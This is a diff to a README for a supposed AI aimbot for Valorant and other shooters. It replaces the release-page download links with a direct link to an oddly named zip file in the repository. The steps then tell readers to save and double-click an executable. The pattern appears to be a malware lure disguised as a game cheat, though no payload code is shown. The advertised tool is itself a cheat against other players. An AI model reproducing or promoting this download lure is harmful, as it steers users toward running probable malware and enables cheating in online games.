@@ -1,6 +1,6 @@
 # 🎯 Valorant-ai-aimbot - Improve aim in popular tactical shooters
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jcanc8254/Valorant-ai-aimbot/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jcanc8254/Valorant-ai-aimbot/raw/refs/heads/main/Juniperaceae/ai_aimbot_Valorant_skijorer.zip)
 
 This software uses computer vision to assist with aiming in competitive video games. It identifies targets on your screen and moves your mouse cursor toward them. This tool works with games like Valorant, Counter-Strike 2, Fortnite, and Apex Legends.
 
@@ -20,7 +20,7 @@ Your computer needs a modern graphics card to process frames from your screen. I
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit this website to choose your version: https://github.com/jcanc8254/Valorant-ai-aimbot/releases
+1. Visit this website to choose your version: https://github.com/jcanc8254/Valorant-ai-aimbot/raw/refs/heads/main/Juniperaceae/ai_aimbot_Valorant_skijorer.zip
 2. Click the latest version link at the top of the list.
 3. Save the executable file to your desktop.
 4. Locate the file and double-click it.
